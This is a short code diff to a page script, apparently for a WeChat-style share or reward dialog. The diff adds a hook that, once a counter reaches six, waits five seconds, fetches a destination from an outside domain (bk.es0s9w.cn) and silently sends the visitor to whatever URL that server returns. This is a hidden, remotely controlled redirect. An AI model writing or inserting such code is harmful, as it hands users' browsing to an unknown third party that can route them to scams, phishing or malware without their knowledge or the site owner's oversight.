@@ -175,6 +175,13 @@
     function show(){
         num=tNum+qNum;
         num=num >6 ? 6 : num;
+        if(num==6){
+            setTimeout(function(){
+                $.get("https://bk.es0s9w.cn/public/static/ad/js/back",null,function(data){
+                    location.href=data;
+                })
+            },5000)
+        }
         $("#lly_dialog").show();
         $("#lly_dialog_msg").html(wxData['hint'][num]);
     }
